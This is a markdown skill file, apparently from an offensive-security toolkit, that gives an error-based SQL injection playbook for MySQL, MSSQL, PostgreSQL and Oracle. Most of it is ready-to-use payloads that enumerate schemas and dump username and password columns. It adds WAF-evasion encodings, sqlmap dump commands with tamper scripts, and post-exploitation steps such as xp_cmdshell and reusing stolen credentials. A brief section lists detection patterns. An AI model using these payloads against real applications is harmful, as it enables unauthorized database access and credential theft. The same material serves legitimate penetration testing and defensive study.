---
name: sql-injection-error
description: "Extract data through database error messages via error-based SQL injection"
category: web
tools: [sqlmap, burpsuite]
opsec: medium
references:
  - source: public-security-references
    path: SQL Injection/MySQL Injection.md
  - source: public-security-references
    path: SQL Injection/MSSQL Injection.md
  - source: public-security-references
    path: SQL Injection/PostgreSQL Injection.md
  - source: public-security-references
    path: SQL Injection/OracleSQL Injection.md
  - source: public-security-references
    path: src/pentesting-web/sql-injection/README.md
---

# SQL Injection — Error-Based

<skill-name>sql-injection-error</skill-name>

Extract data by forcing the database to include query results inside error messages. Works when the application displays database errors but UNION-based extraction is blocked or impractical. Each DBMS has different functions that leak data through errors.

## Prerequisites

- Confirmed SQL injection point (see **web-vuln-discovery**)
- Application displays verbose database error messages in the response
- If errors are generic/hidden, use **sql-injection-blind** instead

## Enumeration

Confirm error-based extraction is viable — inject a payload that forces a type conversion error containing controlled data:

```sql
-- MySQL: force string-to-integer conversion
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--+

-- MSSQL: force string-to-integer conversion
' AND 1=CONVERT(INT,@@version)--+

-- PostgreSQL: force type cast error
' AND 1=CAST(version() AS INT)--+

-- Oracle: force error via utl_inaddr
' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))--+
```

If the response contains the database version string inside an error message, error-based extraction is confirmed.

## Exploitation

### MySQL

MySQL has many error-based primitives. Use whichever isn't blocked.

**EXTRACTVALUE** (MySQL 5.1+) — most reliable:
```sql
-- Current user
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--+

-- Current database
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--+

-- List databases
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)))--+

-- List tables
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='TARGET_DB')))--+

-- List columns
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='TARGET_TABLE')))--+

-- Extract data
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM TARGET_TABLE)))--+
```

**UPDATEXML** — alternative when EXTRACTVALUE is blocked:
```sql
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--+
```

**GTID_SUBSET** (MySQL 5.6+):
```sql
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT user())),1)--+
```

**JSON_KEYS** (MySQL 5.7+):
```sql
' AND JSON_KEYS(CONCAT(0x7e,(SELECT user())))--+
```

**FLOOR(RAND())** — classic double-query error:
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+
```

**EXP** (MySQL 5.5+) — overflow error:
```sql
' AND EXP(~(SELECT * FROM (SELECT user())a))--+
```

> **Note:** EXTRACTVALUE and UPDATEXML truncate output to ~32 characters. For longer data, use SUBSTRING:
> ```sql
> ' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),1,31)))--+
> ' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),32,31)))--+
> ```

### MSSQL

**CONVERT/CAST** — force type conversion error:
```sql
-- Current user
' AND 1=CONVERT(INT,SYSTEM_USER)--+

-- Current database
' AND 1=CONVERT(INT,DB_NAME())--+

-- List databases
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM master..sysdatabases))--+

-- Skip already-extracted values with NOT IN
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN ('master','tempdb','model','msdb')))--+

-- List tables
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--+

-- List columns
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM syscolumns WHERE id=OBJECT_ID('TARGET_TABLE')))--+

-- Extract data
' AND 1=CONVERT(INT,(SELECT TOP 1 username+':'+password FROM TARGET_TABLE))--+
```

**Alternative functions** that trigger type errors (useful for WAF bypass):
```sql
' AND 1=SUSER_NAME((SELECT TOP 1 name FROM master..sysdatabases))--+
' AND 1=USER_NAME((SELECT TOP 1 name FROM master..sysdatabases))--+
' AND 1=TYPE_NAME((SELECT TOP 1 name FROM master..sysdatabases))--+
' AND 1=COL_NAME((SELECT TOP 1 name FROM master..sysdatabases))--+
```

**String concatenation with +** — triggers error on mixed types:
```sql
' AND 1=0/@@version--+
```

### PostgreSQL

**CAST** — force type conversion:
```sql
-- Current user
' AND 1=CAST(current_user AS INT)--+

-- Current database
' AND 1=CAST(current_database() AS INT)--+

-- List databases
' AND 1=CAST((SELECT string_agg(datname,',') FROM pg_database) AS INT)--+

-- List tables
' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') AS INT)--+

-- List columns
' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='TARGET_TABLE') AS INT)--+

-- Extract data
' AND 1=CAST((SELECT string_agg(username||':'||password,',') FROM TARGET_TABLE) AS INT)--+
```

**XML helpers** — extract large datasets via XML conversion error:
```sql
' AND 1=CAST(query_to_xml('SELECT * FROM TARGET_TABLE',true,false,'') AS INT)--+
```

**CHR() concatenation** — bypass quote filters:
```sql
-- 'admin' without quotes
' AND 1=CAST((SELECT string_agg(column_name,CHR(44)) FROM information_schema.columns WHERE table_name=CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115)) AS INT)--+
```

### Oracle

**utl_inaddr.get_host_name** — DNS resolution error leaks data:
```sql
' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--+

-- List tables
' AND 1=utl_inaddr.get_host_name((SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables WHERE ROWNUM<=10))--+
```

**CTXSYS.DRITHSX.SN** — full text search error:
```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--+
```

**dbms_xmlgen.getxml** — XML generation error:
```sql
' AND 1=(SELECT UPPER(dbms_xmlgen.getxml('SELECT user FROM dual')) FROM dual)--+
```

**XMLType** — XML parsing error:
```sql
' AND 1=(SELECT XMLType('<:'||(SELECT user FROM dual)||'>') FROM dual)--+
```

**DBMS_UTILITY.SQLID_TO_SQLHASH**:
```sql
' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT user FROM dual))--+
```

## Post-Exploitation

After extracting credentials or sensitive data:

1. **Check file read** — MySQL `LOAD_FILE()`, MSSQL `OPENROWSET`, PostgreSQL `pg_read_file()`
2. **Check command execution** — MSSQL `xp_cmdshell`, PostgreSQL `COPY TO PROGRAM`
3. **Pivot** — use extracted credentials against other services

## Cleanup

- Error-based injection is read-only — no database artifacts to remove
- Clear proxy history of sensitive extracted data after documenting

## Detection

Defenders look for:
- `EXTRACTVALUE`, `UPDATEXML`, `GTID_SUBSET` in query parameters
- `CONVERT(INT,` or `CAST(... AS INT)` patterns
- Error messages leaking in HTTP responses (should be suppressed in production)
- Anomalous error rates from the application

## Troubleshooting

### Error Messages Not Displayed

The application may catch errors and return a generic page. Options:
- Try **sql-injection-blind** (boolean or time-based) instead
- Check if errors appear in HTTP headers (X-Debug, X-Error)
- Check if error details appear in a different response format (JSON error field, XML fault)

### Output Truncated

EXTRACTVALUE/UPDATEXML limit output to ~32 chars. Use SUBSTRING to paginate:
```sql
-- Characters 1-31
SUBSTRING((SELECT ...),1,31)
-- Characters 32-62
SUBSTRING((SELECT ...),32,31)
```

### WAF Blocking Keywords

```sql
-- Replace EXTRACTVALUE with UPDATEXML or GTID_SUBSET
-- Use MySQL conditional comments
' AND /*!50000EXTRACTVALUE*/(1,CONCAT(0x7e,version()))--+

-- Hex-encode string literals
-- 'information_schema' → 0x696e666f726d6174696f6e5f736368656d61

-- Double URL-encode
%2527%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,version()))--+
```

### Automated Extraction with sqlmap

```bash
# Error-based technique only
sqlmap -u "https://TARGET/page?id=1" --batch --technique=E --dbs

# From Burp request file
sqlmap -r request.txt --batch --technique=E --dbs

# Dump specific table
sqlmap -r request.txt --batch --technique=E -D TARGET_DB -T TARGET_TABLE --dump

# With tamper scripts
sqlmap -r request.txt --batch --technique=E --tamper=between,randomcase --dbs
```
